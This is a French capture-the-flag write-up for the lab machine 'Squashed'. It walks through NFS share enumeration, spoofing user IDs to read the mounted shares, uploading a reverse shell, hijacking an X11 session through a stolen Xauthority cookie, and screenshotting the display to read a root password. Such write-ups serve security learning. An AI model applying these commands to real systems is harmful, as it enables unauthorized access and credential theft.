# Squashed - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-09 23:01 EST                                                                                                                               
Nmap scan report for 10.10.11.191                                                                                                                                                             
Host is up (0.029s latency).                                                                                                                                                                  
Not shown: 996 closed tcp ports (conn-refused)                                                                                                                                                
PORT     STATE SERVICE VERSION                                                                                                                                                                
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                                                           
| ssh-hostkey:                                                                                                                                                                                
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39361/udp   mountd
|   100005  1,2,3      42399/tcp6  mountd
|   100005  1,2,3      55677/tcp   mountd
|   100005  1,2,3      55999/udp6  mountd
|   100021  1,3,4      35773/tcp   nlockmgr
|   100021  1,3,4      41729/udp   nlockmgr
|   100021  1,3,4      43445/tcp6  nlockmgr
|   100021  1,3,4      49839/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lors de la visite du site web, rien de particulier n’est trouvé, c’est un site vide et gobuster ne montre rien. Je me tourne alors vers nfs en me renseignant sur ce que c’est.

```
It is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory. It has the same purpose as SMB but it cannot talk to SMB.
```

On découvre alors plusieurs directory partagés:

```bash
showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

On essaye alors de mount un de ces directories:

```bash
sudo mount -t nfs 10.10.11.191:/home/ross /mnt/remote
```

On tombe alors des fichiers tel que l’on peut  trouver sur un windows (alors que c’est un linux)

Il y a une database keypass mais sans le master password on ne peut pas faire grand chose

Le 2éme drive est lisible que par www-data. En cherchant un peu plus il est possible de duper NFS pour lui faire croire qu’on est www-data. Pour cela il faut créer un utilisateur local avec le même ID.

```bash
sudo useradd squashed
sudo usermod -u 2017 squashed
sudo groupmod -g 2017 squashed
```

On a donc maintenant accès au fichiers du serveur.

Il est donc possible d’upload un reverse shell et y accéder, on obtient le flag user et un foothold  sur le compte de alex.

A partir d’ici pas trop de pistes à part des fichiers par rapport à Xauthority dans le home de ross, on utilise la technique précédente pour mount sur notre machine et impersonifier ross

Rappel pour avoir l’id d’un user:

```bash
id -u ross
```

Maintenant on peut lire les fichiers de ross, notamment Xauthority:

```bash
squashed.htb0MIT-MAGIC-COOKIE-15mL9 ~<s
```

Ceci fait référence à X11 qui gère les fenetres linux

```bash
Essentially, when paired with a display manager, it serves as a full-fledged GUI which you can use to run programs that might not run headlessly.
```

Ce que nous avons est le cookie qui nous permet de nous authentifier à la session X

Il est facile de voler le cookie en faisant un simple set de variable (sur la session d’alex !):

```bash
export XAUTHORITY=/tmp/.Xauthority
```

Pour connaître le display utilisé il suffit de faire “w” sur la session de alex

```bash
w
 16:22:59 up 23 min,  1 user,  load average: 0.00, 0.00, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               16:00   22:53   3.00s  0.03s /usr/libexec/gnome-session-binary --systemd --session=gnome
```

On peut alors utiliser xwd pour prendre un screenshot de l’écran

```bash
xwd -root -screen -silent -display :0 > /tmp/screen.xwd
```

Il faut ensuite récupérer ce fichier, avec un serveur python3 puis le convertir en format normal ou ouvrir avec gimp

La fenêtre active était le password manager avec le mdp du compte admin, on a donc root !

(ssh est désactivé pour root il faut alors su depuis alex)